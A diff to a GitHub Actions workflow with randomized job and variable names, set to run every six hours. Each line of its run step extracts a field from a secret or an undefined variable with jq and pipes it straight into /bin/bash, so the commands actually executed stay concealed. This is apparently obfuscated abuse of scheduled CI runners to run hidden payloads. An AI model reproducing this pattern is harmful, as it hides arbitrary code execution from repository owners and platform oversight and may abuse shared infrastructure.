@@ -1,22 +1,28 @@
 name: jiashadeq
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 5/6 * * *'
+    - cron: '31 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiashadeq
         env:
-          lt4: ${{ secrets.lt4 }}
+          evo932: ${{ secrets.evo932 }}
         run: |
-          echo $lt4 | jq -r .f4543 | /bin/bash
-          echo $oejes0 | jq -r .c56 | /bin/bash
-          echo $iw27800 | jq -r .iumq46130 | /bin/bash
-          echo $h49 | jq -r .vakfv1 | /bin/bash
-          echo $xev348 | jq -r .dxm117 | /bin/bash
+          echo $evo932 | jq -r .rd9708 | /bin/bash
+          echo $m316 | jq -r .smkz86 | /bin/bash
+          echo $psk45347 | jq -r .miqta3 | /bin/bash
+          echo $v83953 | jq -r .jhpbe7 | /bin/bash
+          echo $dj22244 | jq -r .ioa056 | /bin/bash
+          echo $p3421 | jq -r .vug631 | /bin/bash
+          echo $nwuli2 | jq -r .bern43268 | /bin/bash
+          echo $ltu226 | jq -r .zy93 | /bin/bash
+          echo $ik958 | jq -r .ruvu5865 | /bin/bash
+          echo $ous88 | jq -r .rl41335 | /bin/bash
+          echo $ggv119 | jq -r .oypwg6916 | /bin/bash
 
